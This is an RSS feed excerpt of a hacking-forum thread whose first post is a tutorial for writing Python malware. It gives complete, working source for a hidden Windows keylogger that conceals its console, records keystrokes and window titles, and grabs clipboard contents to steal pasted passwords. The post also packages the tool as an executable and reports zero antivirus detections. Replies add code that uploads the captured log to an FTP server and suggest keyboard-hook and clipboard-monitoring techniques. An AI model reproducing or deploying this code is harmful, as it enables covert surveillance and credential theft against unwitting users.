<p>I would like to point out there is an event-based method that performs better than <code>GetAsncKeyState</code> which is via <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-setwindowshookexw"><code>SetWindowsHookEx</code></a> with the <code>WH_KEYBOARD_LL</code> hook type that can install a global monitor on keystrokes. Please refer to <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985(v=vs.85).aspx"><code>LowLevelKeyboardProc</code></a> for the callback function details. For an example (in C), you can refer to my previous thread on <a href="https://0x00sec.org/t/windows-keylogging-part-i/99">Windows Keylogging</a> (shameless self-promotion <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">).</p>
<aside class="quote no-group" data-username="tr4cefl0w" data-post="1" data-topic="11700">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/letter_avatar_proxy/v4/letter/t/c2a13f/40.png" class="avatar"> tr4cefl0w:</div>
<blockquote>
<pre><code class="lang-python">import ctypes # For interfacing with C functions 
import logging # For logging the keystrokes on disk 

kernel32 = ctypes.windll.kernel32 # Access functions from kernel32.dll 
user32 = ctypes.windll.user32 # Access functions from user32.dll 

user32.ShowWindow(kernel32.GetConsoleWindow(), 0) # Hide console
</code></pre>
</blockquote>
</aside>
<p>I’m assuming the reason you need this is because you’re building a console application. If you can get it to build with the Windows (GUI) subsystem, it removes the console prompt entirely, making this code redundant. It’s also good to note that if you do this, you may need the <a href="https://docs.microsoft.com/en-us/windows/desktop/learnwin32/window-messages">Windows Message Loop</a> to keep the application alive. It’ll be needed to obtain messages for the keystrokes from <code>SetWindowsHookEx</code> as well.</p>
<p>As for the clipboard monitor, there are a <a href="https://docs.microsoft.com/en-us/windows/desktop/dataxchg/using-the-clipboard#monitoring-clipboard-contents">few ways to do it</a>. MSDN documents one way through <a href="https://docs.microsoft.com/en-us/windows/desktop/api/Winuser/nf-winuser-getclipboardsequencenumber"><code>GetClipboardSequenceNumber</code></a> that uses a 32-bit “clipboard sequence number” to track different clipboard contents. It also documents an event-based listener with <a href="https://docs.microsoft.com/en-us/windows/desktop/api/Winuser/nf-winuser-addclipboardformatlistener"><code>AddClipboardFormatListener</code></a> with the <a href="https://docs.microsoft.com/en-us/windows/desktop/dataxchg/wm-clipboardupdate"><code>WM_CLIPBOARDUPDATE</code></a> window message (requires a window). Here is some PoC code that demonstrates the latter: <a href="https://gist.github.com/NtRaiseHardError/df8075c303d89ef9dc6003f5d0171dd1">ClipboardMonitor.c</a>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/009cc28e8cdba879e792bd392ec18699d41164f6.gif" alt="clipmon" data-base62-sha1="5pR7fs8HlFsebjsd03lW7MOq46" width="690" height="283"></p>
<p>EDIT: I just realised that your code might not account for right-click -&gt; copy.</p>
<p>Looking forward to the rest of the series!</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/3</link>
        <pubDate>Wed, 20 Feb 2019 00:18:26 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-3</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[metalerk]]></dc:creator>
        <description><![CDATA[
            <p>Cool! maybe it can upload the resulting logfile to ftp:</p>
<pre><code>import platform
from ftplib import FTP

class FTPConnectionHandler:
    def __init__(self, host, user, passwd):
        self.conn = FTP(host=host, user=user, passwd=passwd)

    def __enter__(self):
        return self.conn

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.conn.close()

def upload_logfile(filepath, host, user, passwd):
    with FTPConnectionHandler(host, user, passwd) as ftp:
        with open(filepath, 'rb') as f:
            ftp.storbinary('STOR {}_history.log'.format(platform.node()), f)</code></pre>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/2</link>
        <pubDate>Tue, 19 Feb 2019 23:00:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-2</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
      <item>
        <title>Malware writing - Python malware, part 1</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <h1>Malware writing series - Python Malware, part 1</h1>
<p>I recently was sifting through a bunch of Humble Bundle, which like many, I had acquired in the past but never read and saw Black Hat Python. Curious to see what this was all about, I started looking some of the examples and identified issues that really annoyed me.</p>
<ol>
<li>It’s written for Python 2.7. Python 3 has been out for years.</li>
<li>It uses multiple packages that are now deprecated or extremely buggy, such as pyHook.</li>
<li>It lacks a lot of neat tricks that one could do simply with standard user privileges.</li>
</ol>
<p>Having written my share of malwares for <strong>fun</strong> <em>cough</em> in the past, I thought it would be interesting to revisit some basic features using today’s most <em>hip</em> and popular languages. I think it will also be a good tutorial for people starting in security in general to give a rough idea of the capabilities.</p>
<p>It’s worth noting that popular red team techniques such as dumping credentials from LSASS are almost completely useless with modern EDR (Endpoint Detection and Response) solutions as this is what they are looking for.</p>
<p>Which is why going back to basics and have a little bit of patience is all you need and is the most efficient. Everything is done here with standard user privileges, in the user’s context.</p>
<p>So why Python?<br>
- Easy to learn and good for good for people new to programming<br>
- Less commonly used and less chances to get flagged by AVs<br>
- Can be executed in multiple ways.<br>
- Can interface with C functions and the Windows API with ctypes or pywin32</p>
<p>But there are a few shortcomings:<br>
- Slow and low performance compared to pure C because the code interpreted during execution<br>
- Large executables (but it’s 2019 so bandwith shouldn’t be an issue)<br>
- Can’t do real multi-threading due to GIL (we’ll get into that later in the series)</p>
<p>The tutorial will be divided in multiple parts. In each part, we will build a different module that will provide a specific set of features to our malware,including a module to use Github as C2 (always better to hide in plain sight). Then we’ll look at different ways to run, compile and distribute the malware. The code will be available in the <a href="https://github.com/tr4cefl0w/0x00sec" rel="noopener nofollow ugc">https://github.com/tr4cefl0w/0x00sec</a> repository.</p>
<p>It’s worth mentioning that I didn’t add a lot of exception handling or did much testing due to lack of time, but it’s good enough (and like Joel Salatin says, good enough is perfect) for an introduction. Also, I’m not a Python expert and haven’t touched the WinAPI a lot in the past decade so feel free to point out any mistake or improvements that could be done.</p>
<p>This part focuses on keylogging, the second part will likely be capturing or dumping credentials, although there’s some of this in that first part with the clipboard.</p>
<p>That keylogger currently has 0 detections on VirusTotal but it doesn’t do much other than logging. It’s not sending the data or doing anything else. You can find the results here:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/d/9/d94764657d0d75c8dc3b4c65d15a3a10d3418817.png" class="site-icon" width="100" height="89">
      <a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener nofollow ugc">virustotal.com</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener nofollow ugc">VirusTotal</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<h2>Building a keylogger</h2>
<p>Calling functions is easy, but figuring out the algorithm is often the painful part.</p>
<p>First and foremost, we want to determine the actions that will need to be performed. What’s the point of logging what’s typed if you can’t contextualize it?</p>
<p>We need to know:<br>
- What the current program is?<br>
- When and what keys are pressed?<br>
- How to deal with special keys and how we can use them?<br>
- When to capture the clipboard?</p>
<p>To do so, we need to find a way to access multiple Windows API functions. Code from Black Hat Python and similar books mostly pyWin32 and pyHook. But, pyHook is only (officialy) available for Python 2.7 and still has a lot of old bugs that have yet to be fixed. For the keylogger, I figured it’d be better to use ctypes from the standard library as it would show some basics on how to use it to call Windows API functions.</p>
<p>In future parts we’ll likely just use PyWin32 for the simplicity and great documentation.</p>
<p>Let’s start.</p>
<p>Create a folder for the project and a sub-folder called modules. In the modules folder, create the file <code>keylogger.py</code> then open it in your text editor.</p>
<p>We first import the required standard libraries. Then, we have to import the Windows DLLs that provide the functions we’ll need. In this case, we’ll need <code>kernel32.dll</code> and <code>user32.dll</code>. Finally, we want to avoid showing the console window on the desktop which would raise suspicions.</p>
<pre><code class="lang-auto">import ctypes       # For interfacing with C functions
import logging      # For logging the keystrokes on disk

kernel32 = ctypes.windll.kernel32   # Access functions from kernel32.dll
user32 = ctypes.windll.user32       # Access functions from user32.dll

user32.ShowWindow(kernel32.GetConsoleWindow(), 0)   # Hide console
</code></pre>
<h3>get_current_window() function</h3>
<p>We have to build a function to get the current window title so we know in what program the user is typing.</p>
<pre><code class="lang-auto">def get_current_window(): # Function to grab the current window and its title
    
    # Required WinAPI functions
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW
    
    hwnd = GetForegroundWindow() # Get handle to foreground window
    length = GetWindowTextLength(hwnd) # Get length of the window text in title bar, passing the handle as argument
    buff = ctypes.create_unicode_buffer(length + 1) # Create buffer to store the window title string
    
    GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff

    return buff.value # Return the value of buff
</code></pre>
<p>Now we can use this function to get the current window title and later use it in the keylogging function.</p>
<h3>get_clipboard() function</h3>
<p>The second function is to capture the content of the clipboard. It is a bit tricky to set up but it shows how to use pointers with ctypes.</p>
<pre><code class="lang-auto">def get_clipboard():
    
    CF_TEXT = 1 # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)
    
    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT) # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get pointer to memory location where the data is located
            text = ctypes.c_char_p(data_locked) # Get a char * pointer (string in Python) to the location of data_locked
            value = text.value # Dump the content in value
            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
            return value.decode('utf-8') # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard
</code></pre>
<p>Now we have the function to capture the clipboard content. Of course this could be done in fewer lines of code with PyWin32 but I figured it would be good to do something using only the standard library and show some basic usage of ctypes.</p>
<h3>get_keystrokes() function</h3>
<p>Now, the keylogging function. That function, when called, requires two argument. The directory where the log file will be stored and the file name. Then, we configure the logger that will write the log file on disk. Finally, we set up the WinAPI function and variables we need, such as a dictionary for the special keys pressed such as , ,  and so on.</p>
<p>The keylogging algorithm is set to run indefinitely using a <code>while</code> loop. The reason is that we don’t want the keylogging to stop unless it is told to do so. This means that if we want to do other tasks meanwhile, we need to run it in parallel with other functions either in a thread or separate process. This will be challenging and we’ll cover this later in the series when attempting to do real parallelism (which is not the same as concurrency by the way). We’ll also introduce some modifications to use a timer to stop/start the keylogger as an alternative to parallelism.</p>
<pre><code class="lang-auto">def get_keystrokes(log_dir, log_name): # Function to monitor and log keystrokes

    # Logger
    logging.basicConfig(filename=(log_dir +"\\" + log_name), level=logging.DEBUG, format='%(message)s')

    GetAsyncKeyState = user32.GetAsyncKeyState # WinAPI function that determines whether a key is up or down
    special_keys = {0x08: 'BS', 0x09: 'Tab', 0x10: 'Shift', 0x11: 'Ctrl', 0x12: 'Alt', 0x14: 'CapsLock', 0x1b: 'Esc', 0x20: 'Space', 0x2e: 'Del'}
    current_window = None
    line = [] # Stores the characters pressed

    while True:

        if current_window != get_current_window(): # If the content of current_window isn't the currently opened window
            current_window = get_current_window() # Put the window title in current_window
            logging.info(str(current_window).encode('utf-8')) # Write the current window title in the log file
        
        for i in range(1, 256): # Because there are 256 ASCII characters (even though we only really use 128)
            if GetAsyncKeyState(i) &amp; 1: # If a key is pressed and matches an ASCII character
                if i in special_keys: # If special key, log as such
                    logging.info("&lt;{}&gt;".format(special_keys[i]))
                elif i == 0x0d: # If &lt;ENTER&gt;, log the line typed then clear the line variable
                    logging.info(line)
                    line.clear()
                elif i == 0x63 or i == 0x43 or i == 0x56 or i == 0x76: # If characters 'c' or 'v' are pressed, get clipboard data
                    clipboard_data = get_clipboard()
                    logging.info("[CLIPBOARD] {}".format(clipboard_data))
                elif 0x30 &lt;= i &lt;= 0x5a: # If alphanumeric character, append to line
                    line.append(chr(i))
</code></pre>
<p>That’s it! A side note on capturing the clipboard data. We trigger the function when the user’s presses ‘c’ or ‘v’ because we want to log when a password is copied for a password manager and in case the user right-clicks to paste instead of using the keyboard shortcut. However, this might repeatedly log the clipboard content in the log file. We could call EmptyClipboard() after but that could raise suspicions. If you think of a better way, feel free to share!</p>
<p>Now we assemble everything to make the keylogger module.</p>
<pre><code class="lang-auto">import ctypes
import logging

# Required librairies
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

# Hide console
user32.ShowWindow(kernel32.GetConsoleWindow(), 0)

def get_current_window(): # Function to grab the current window and its title

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow() # Get handle to foreground window
    length = GetWindowTextLength(hwnd) # Get length of the window text in title bar
    buff = ctypes.create_unicode_buffer(length + 1) # Create buffer to store the window title string
    
    GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff

    return buff.value # Return the value of buff

def get_clipboard():
    
    CF_TEXT = 1 # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)
    
    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT): # If CF_TEXT is available
            data = GetClipboardData(CF_TEXT) # Get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) # Get pointer to memory location where the data is located
            text = ctypes.c_char_p(data_locked) # Get a char * pointer (string in Python) to the location of data_locked
            value = text.value # Dump the content in value
            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
            return value.decode('utf-8') # Return the clipboard content
    finally:
        CloseClipboard() # Close the clipboard

def get_keystrokes(log_dir, log_name): # Function to monitor and log keystrokes

    # Logger
    logging.basicConfig(filename=(log_dir +"\\" + log_name), level=logging.DEBUG, format='%(message)s')

    GetAsyncKeyState = user32.GetAsyncKeyState # WinAPI function that determines whether a key is up or down
    special_keys = {0x08: 'BS', 0x09: 'Tab', 0x10: 'Shift', 0x11: 'Ctrl', 0x12: 'Alt', 0x14: 'CapsLock', 0x1b: 'Esc', 0x20: 'Space', 0x2e: 'Del'}
    current_window = None
    line = [] # Stores the characters pressed

    while True:

        if current_window != get_current_window(): # If the content of current_window isn't the currently opened window
            current_window = get_current_window() # Put the window title in current_window
            logging.info(str(current_window).encode('utf-8')) # Write the current window title in the log file
        
        for i in range(1, 256): # Because there are 256 ASCII characters (even though we only really use 128)
            if GetAsyncKeyState(i) &amp; 1: # If a key is pressed and matches an ASCII character
                if i in special_keys: # If special key, log as such
                    logging.info("&lt;{}&gt;".format(special_keys[i]))
                elif i == 0x0d: # If &lt;ENTER&gt;, log the line typed then clear the line variable
                    logging.info(line)
                    line.clear()
                elif i == 0x63 or i == 0x43 or i == 0x56 or i == 0x76: # If characters 'c' or 'C' are pressed, get clipboard data
                    clipboard_data = get_clipboard()
                    logging.info("[CLIPBOARD] {}".format(clipboard_data))
                elif 0x30 &lt;= i &lt;= 0x5a: # If alphanumeric character, append to line
                    line.append(chr(i))
</code></pre>
<p>To run the keylogger, we need to create the main program file that will import the module and execute the keylogger. In the root of your project directory, create a <code>main.py</code> file and add the following:</p>
<pre><code class="lang-auto">import os
from modules import keylogger

log_dir = os.environ['localappdata']
log_name = 'applog.txt'

keylogger.get_keystrokes(log_dir, log_name)
</code></pre>
<p>You can modify the <code>log_dir</code> and <code>log_name</code> to set the folder and file name of your choice. You can then run it as a Python script with <code>python main.py</code> or build a standalone executable with PyInstaller like the one uploaded on Virus Total. To do so, install PyInstaller with <code>pip install pyinstaller</code> then run <code>pyinstaller --onefile main.py -w</code>.</p>
<p>The executable will be located in the <code>dist</code> folder. If you run it through Window Explorer, you’ll see that no console window appears.</p>
<p>I created a dummy account in Bitwarden (my password manager) and attempted to log in Office 365 just to show the password being pasted with the clipboard when ‘v’ is hit. Here’s the content of the log file.</p>
<pre><code class="lang-auto">b'Bitwarden'
b'Sign in to your Microsoft account - Firefox Developer Edition (Private Browsing)'
&lt;Ctrl&gt;
[CLIPBOARD] p1zz4
</code></pre>
<p>Looking at the task manager, you can see it running:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a18b1ea1726436c4c93116ba4bb8d8947ec4e4e6.png" alt="2019-02-19%2010_07_48-Task%20Manager" data-base62-sha1="n34VYZ5b3JkQHMGPqW7qa5setGm" width="621" height="54"></p>
<p>Look at that CPU usage! As pointed out by <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a> in comments, this is mostly caused by the fact that we’re using GetAsyncKeyState() instead of SetWindowsHookExA() and he is right.</p>
<p>However, after testing a simple example of Python keylogger using SetWindowsHookExA(), it triggered 4 AVs detections:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/d/9/d94764657d0d75c8dc3b4c65d15a3a10d3418817.png" class="site-icon" width="100" height="89">
      <a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener nofollow ugc">virustotal.com</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener nofollow ugc">VirusTotal</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>To investigate! I’ll attempt to find a way to use SetWindowsHookExA() without triggering any detection and update the code and the article if I succeed. If any of you can do it, please share in comment <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Python references:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://docs.python.org/3/library/ctypes.html/../_static/py.png" class="site-icon" width="" height="">
      <a href="https://docs.python.org/3/library/ctypes.html" target="_blank" rel="noopener nofollow ugc">docs.python.org</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://docs.python.org/3/library/ctypes.html" target="_blank" rel="noopener nofollow ugc">ctypes — A foreign function library for Python — Python 3.8.6 documentation</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://docs.python.org/3/library/logging.html/../_static/py.png" class="site-icon" width="" height="">
      <a href="https://docs.python.org/3/library/logging.html" target="_blank" rel="noopener nofollow ugc">docs.python.org</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://docs.python.org/3/library/logging.html" target="_blank" rel="noopener nofollow ugc">logging — Logging facility for Python — Python 3.8.6 documentation</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      
      <a href="https://pyinstaller.readthedocs.io/en/stable/usage.html" target="_blank" rel="noopener nofollow ugc">pyinstaller.readthedocs.io</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://pyinstaller.readthedocs.io/en/stable/usage.html" target="_blank" rel="noopener nofollow ugc">Using PyInstaller — PyInstaller 4.0 documentation</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>MSDN references:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/" target="_blank" rel="noopener nofollow ugc">Winuser.h header - Win32 apps</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globallock" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png" class="thumbnail" width="" height="">

<h3><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globallock" target="_blank" rel="noopener nofollow ugc">GlobalLock function (winbase.h) - Win32 apps</a></h3>

<p>Locks a global memory object and returns a pointer to the first byte of the object's memory block.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://docs.microsoft.com/en-us/windows/win32/dataxchg/standard-clipboard-formats" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png" class="thumbnail" width="" height="">

<h3><a href="https://docs.microsoft.com/en-us/windows/win32/dataxchg/standard-clipboard-formats" target="_blank" rel="noopener nofollow ugc">Standard Clipboard Formats (Winuser.h) - Win32 apps</a></h3>

<p>The clipboard formats defined by the system are called standard clipboard formats. These clipboard formats are described in the following table.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://docs.microsoft.com/en-us/windows/win32/dataxchg/clipboard-functions" target="_blank" rel="noopener nofollow ugc">docs.microsoft.com</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/046bc4e1c9cc27618d0390eaf9e35705a1a77356.png" class="thumbnail" width="" height="">

<h3><a href="https://docs.microsoft.com/en-us/windows/win32/dataxchg/clipboard-functions" target="_blank" rel="noopener nofollow ugc">Clipboard Functions - Win32 apps</a></h3>

<p>.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Edit 2019/02/19: Updated the article taking into account <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a>’s comment.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-1/11700/1</link>
        <pubDate>Tue, 19 Feb 2019 15:31:53 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-11700-1</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-1/11700.rss">Malware writing - Python malware, part 1</source>
      </item>
  </channel>
</rss>
